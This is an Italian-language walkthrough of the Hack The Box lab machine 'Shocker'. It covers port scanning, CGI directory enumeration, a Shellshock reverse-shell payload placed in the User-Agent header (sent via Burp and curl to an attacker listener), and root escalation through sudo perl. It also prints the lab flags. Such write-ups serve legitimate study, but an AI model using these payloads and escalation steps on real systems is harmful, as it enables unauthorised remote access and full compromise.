**Target: 10.10.10.56**

# INFORMATION GAHTERING

Per prima cosa lanciamo un rapido scan con [[Nmap]]

```bash
┌──(root㉿kali)-[/home/kali/htb/shocker]
└─# nmap -sC -sV -O 10.10.10.56           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 02:12 EDT
Nmap scan report for 10.10.10.56
Host is up (0.043s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/16%OT=80%CT=1%CU=40355%PV=Y%DS=2%DC=I%G=Y%TM=64631EE
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M53CST11NW6%O2=M53CST11NW6%O3=M53CNNT11NW6%O4=M53CST11NW6%O5=M53CST1
OS:1NW6%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.39 seconds
```

Un ulteriore scan su tutte le porta non ci da nessun nuovo elemento 

Abbiamo due porte aperte 
```bash
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# ENUMERTION

## Port 80 Apache httpd 2.4.18

Ci rimanda ad una immagine "Don't bug me!" il codice sorgente non ci dice nulla di nuovo

Cercando con searchsploit non abbiamo nulla che possiamo utilizzare

```bash
┌──(root㉿kali)-[/home/kali/htb/shocker]
└─# searchsploit Apache httpd 2.4.18
Exploits: No Results
Shellcodes: No Results
Papers: No Results
                                                                                                    
┌──(root㉿kali)-[/home/kali/htb/shocker]
└─# searchsploit OpenSSH 7.2p2      
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                          | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                    | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                   | linux/dos/40888.py
OpenSSH 7.2p2 - Username Enumeration                              | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix  | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading          | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                              | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                             | linux/remote/40113.txt
------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Proviamo ad enumerare con [[Gobuster]] per vedere se abbiamo qualche directory esposta:

```
┌──(root㉿kali)-[/home/kali/htb/shocker]
└─# gobuster dir -u http://10.10.10.56 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/16 02:26:32 Starting gobuster in directory enumeration mode
===============================================================
Progress: 81612 / 81644 (99.96%)
===============================================================
2023/05/16 02:32:53 Finished
===============================================================
```

Sembra non aver trovato niente proviamo ad aggiungere "-f" che aggiunge "/" aggiunge "/" a ciascuna richiesta.

Quindi eseguiamo di nuovo [[Gobuster]] 

```bash
┌──(root㉿kali)-[/home/kali/htb/shocker]
└─# gobuster dir -u http://10.10.10.56 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -f
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/05/16 02:33:40 Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 294]
/icons/               (Status: 403) [Size: 292]
Progress: 81560 / 81644 (99.90%)
===============================================================
2023/05/16 02:39:48 Finished
===============================================================

#Abbiamo due dicretory porviamo a cercare file ".sh" e ".cgi"
┌──(root㉿kali)-[/home/kali/htb/shocker]
└─# gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x sh,cgi
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              sh,cgi
[+] Timeout:                 10s
===============================================================
2023/05/16 02:41:16 Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 119]
Progress: 1938 / 244932 (0.79%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/05/16 02:41:25 Finished
===============================================================
```

Abbiamo un file "/user.sh"
Aprendo il file ci troviamo di fornte a quello che sembra essere un script di test


# EXPLOITATION

### Proof of concept

Dopo un richerca su google troviamo dei riferimenti ad una vulnerabilita  ShellSchocker
https://en.wikipedia.org/wiki/Shellshock_(software_bug)

"Server Web basato su CGI
Quando un server Web utilizza la Common Gateway Interface (CGI) per gestire una richiesta di documento, copia determinate informazioni dalla richiesta nell'elenco delle variabili di ambiente e quindi delega la richiesta a un programma di gestione. Se il gestore è uno script Bash, o se esegue Bash, allora Bash riceverà le variabili d'ambiente passate dal server e le elaborerà come descritto sopra. Ciò fornisce a un utente malintenzionato un mezzo per attivare la vulnerabilità Shellshock con una richiesta di documento appositamente predisposta.
La documentazione sulla sicurezza per il server Web Apache ampiamente utilizzato afferma: "Gli script CGI possono ... essere estremamente pericolosi se non vengono controllati attentamente" e in genere vengono utilizzati altri metodi di gestione delle richieste del server Web. Esistono numerosi servizi online che tentano di testare la vulnerabilità contro i server Web esposti a Internet.""

L'idea potrebbe essere quella di riuscire  a modificare quel file con una nostra revshell 
Quello che succede è che tutto quello che si trova all'interno del file user.sh quando viene richiesto tramite GET viene eseguito dal server senza nessun tipo di controllo.

Quindi andiamo a scrivere il codice di una revshell all'interno del file in modo tale che al momento della chiamata GET il codice all'interno del file viene eseguito

# GAINING A FOOTHOLD

A questo indirizzo abbiamo quello che ci serve
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi
https://github.com/erinzm/shellshocker

Possiamo anche verificare con uno script nmap se la macchina taraget è vulenrabile 
```bash
┌──(root㉿kali)-[/home/kali/htb/shocker/shellshocker]
└─# nmap 10.10.10.56 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 07:35 EDT
Nmap scan report for 10.10.10.56
Host is up (0.043s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://seclists.org/oss-sec/2014/q3/685

Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
```

Ci mettiamo sempre in ascolto con nc 
```bash
┌──(root㉿kali)-[/home/kali/htb/shocker]
└─# nc -lnvp 4444
listening on [any] 4444 ...
```

## 1ST METOD BURPSUIT

Apriamo burp e accendiamo l'intercept su on visitiamo "http://10.10.10.56/cgi-bin/user.sh"
intercettiamo la richiesta e la mandiamo al repeter

GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

Modificamo l'User-Agent con la seguente stringa:

```burp
User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.53/4444 0>&1
```

Eseguiamo ed otteniamo una shell

```bash
┌──(root㉿kali)-[/home/kali/htb/shocker]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.10.56] 57280
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 
```

Quello che succede è che tutto quello che si trova all'interno del file user.sh viene eseguito dal server senza nessun tipo di controllo.
Quindi andiamo a scrivere il codice una revshell all'interno del file in modo tale che al momento della chiamata GET il codice all'interno del file viene eseguito

## 2St METOD

Possiamo eseguire la stessa cosa anche da riga di comando con il comando curl 
```bash
┌──(root㉿kali)-[/home/kali]
└─# curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.53/4444 0>&1' http://10.10.10.56/cgi-bin/user.sh
```

Otteniamo una shell anche in questo caso una shell
```bash
┌──(root㉿kali)-[/home/kali/htb/shocker]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.10.56] 57280
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 
```

Upgrade della shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
export SHELL=bash
export TERM=xterm-256colo
```

Flags User:
```bash
shelly@Shocker:/home/shelly$ cat user.txt 
68196ee0cb620a8b119b3c47d999e392
```

# PRIVESC

lanciamo un sudo -l per vedere cosa possiamo eseguire come sudo:

```bash
shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/home/shelly$ 
```

perl ha un'opzione -e che mi consente di eseguire Perl dalla riga di comando. 
Ha anche un comando exec che eseguirà i comandi della shell. 

Mettendo tutto insieme, posso eseguire bash come root:
```bash
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/bash"'
root@Shocker:/home/shelly# 
```

Flag root:

```bash
root@Shocker:~# cat root.txt 
bc6caad0168dcf317ef739aa79e93bab
```
 
# LEZIONI IMPARATE 

Per quanto riguarda le vulnerabilità, ne ho contate tre. 

1. Il primo è un errore di configurazione insicuro del server web. Non mi è stato permesso di accedere alla directory /cgi-bin ma per qualche motivo mi è stato permesso di accedere al file user.sh all'interno di quella directory. L'amministratore dovrebbe avere accesso limitato a tutti i file nella directory.
2. La seconda vulnerabilità è che il server Web stava eseguendo comandi bash su un sistema che eseguiva una versione di Bash vulnerabile alla vulnerabilità Shellshock. Questo ci ha permesso di ottenere l'accesso iniziale al sistema. Ovviamente è disponibile una patch e l'amministratore dovrebbe aver corretto il suo sistema.
4. La terza vulnerabilità è la configurazione del sistema non sicura. Dovresti sempre conformarti al principio del privilegio minimo e al concetto di separazione dei privilegi. Dare all'utente l'accesso sudo per eseguire perl, ha permesso a me (l'attaccante) di aumentare i privilegi.
